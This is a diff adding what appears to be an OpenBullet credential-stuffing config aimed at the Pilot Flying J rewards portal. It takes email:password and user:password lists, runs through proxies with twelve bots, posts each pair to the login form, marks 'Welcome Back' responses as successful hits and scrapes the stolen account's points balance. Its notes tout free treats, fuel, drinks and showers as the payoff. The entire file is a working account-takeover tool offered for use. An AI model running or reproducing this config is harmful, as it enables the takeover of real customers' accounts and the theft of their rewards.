@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Pilot-FlyingJ",
+  "SuggestedBots": 12,
+  "LastModified": "2018-08-09T16:32:06.8559224+00:00",
+  "AdditionalInfo": "Adjust bots to pref. performance.Rewards =  Free treats, Fuel, Drink, Showers ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://portal.pilotflyingj.com/myrewards/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_REDIRECTURL PARSE "<SOURCE>" CSS "[name=RedirectUrl]" "value" 0 -> VAR "REDIRECTURL" "" "" 
+#PARSE_UFPRT PARSE "<SOURCE>" CSS "[name=ufprt]" "value" 0 -> VAR "UFPRT" "" "" 
+#POST_LOGIN REQUEST POST "https://portal.pilotflyingj.com/myrewards/login/myrewards/login" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&Password=<PASS>&RedirectUrl=<REDIRECTURL>&ufprt=<UFPRT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "Welcome Back" 
+PARSE "<SOURCE>" LR "div class=\"rewards-cta__points-balance\">" "<" Recursive=FALSE -> VAR "MyRewards Balance" "" "" 
